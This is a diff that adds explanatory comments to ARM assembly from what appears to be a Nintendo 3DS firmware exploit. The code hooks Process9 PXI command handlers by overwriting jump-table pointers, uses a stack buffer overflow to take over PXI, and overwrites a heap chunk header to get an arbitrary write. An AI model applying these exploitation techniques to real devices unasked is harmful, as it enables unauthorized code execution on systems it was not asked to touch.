@@ -15,9 +15,11 @@
 .equ MEMCHUNK_HDR_NEXT, 0xC
 .equ MEMCHUNK_HDR_SIZE, 0x10
 
+// address of pximcShutdown case's ptr in pximc jump table (switch)
 .equ PXIMC_SHUTDOWN_JUMP_TABLE_PTR, 0x08080E20
 .equ PXIMC_SWITCH_RETURN, 0x08080E64
 
+// address of pxiamImportCertificates case's ptr in pxiam jump table (switch)
 .equ PXIAM_IMPORT_CERTIFICATES_JUMP_TABLE_PTR, 0x08081728
 .equ PXIAM_SWITCH_BREAK, 0x080828D0
 .equ PXIAM_SWITCH_RETURN, 0x08081750
@@ -26,6 +28,7 @@
 
 
 /*
+  This is the entry point.
   Here's the stack state when jumping to _start:
 
   |---------------------- RecycleRegion stack frame ----------------------|
@@ -88,8 +91,13 @@ _start:
   mov r0, #0
   str r0, [sp, #PXIAM_IMPORT_CERTIFICATES_RETURN_CODE_STACK_OFFSET]
 
-  pop {r2-r6, pc}         // last instruction of FreeToHeap, return to actual service code
+  pop {r2-r6, pc}         // return to actual service code
 
+
+/*
+  Install hooks for PXIAM:PXIAM:ImportCertificates and PXIMC:Shutdown command
+  handlers.
+*/
 installHooks:
   ldr r0, =PXIAM_IMPORT_CERTIFICATES_JUMP_TABLE_PTR
   adr r1, _pxiamImportCertificatesHook
@@ -99,29 +107,56 @@ installHooks:
   str r1, [r0]
   bx lr
 
+
+/*
+  Hook for PXIAM:ImportCertificates command handler in pxiam switch.
+  Once it is installed by installHooks, p9 will jump here instead of jumping to
+  the original switch case.
+
+  We use this hook to receive the kernelhaxcode binary which is sent as a
+  certificate via the PXIAM:ImportCertificates command.
+*/
 _pxiamImportCertificatesHook:
-  mov r0, r5
-  bl pxiamImportCertificatesHook
+  mov r0, r5                      // r0 = cmdbuf
+  bl pxiamImportCertificatesHook  // pxiamImportCertificatesHook(cmdbuf)
   ldr r1, =PXIAM_SWITCH_BREAK
-  bx r1
+  bx r1                           // return to actual service code
 
+
+/*
+  Hook for PXIMC:Shutdown command handler in pximc switch.
+  Once it is installed by installHooks, p9 will jump here instead of jumping to
+  the original switch case.
+
+  We use this hook to takeover PXI on the arm11 side (see pximcShutdownHook and
+  pximcShutdownReply) via a stack-buffer-overflow.
+*/
 _pximcShutdownHook:
-  mov r0, r4
-  bl pximcShutdownHook
+  mov r0, r4                      // r0 = cmdbuf
+  bl pximcShutdownHook            // pximcShutdownHook(cmdbuf)
   ldr r1, =PXIMC_SWITCH_RETURN
-  bx r1
+  bx r1                           // return to actual service code
 
+
+/*
+  Panic syscall.
+*/
 .global panic
 .type panic, %function
 panic:
   mov r0, #0
   svc 0x3C
 
+
+/*
+  Call malloc in the original service code.
+*/
 .global heapAllocate
 .type heapAllocate, %function
 heapAllocate:
   ldr r1, =HEAP_ALLOCATE
   bx r1
+
 
 /*
   This is the chunk header overwritten to get an arb write when unlinking.
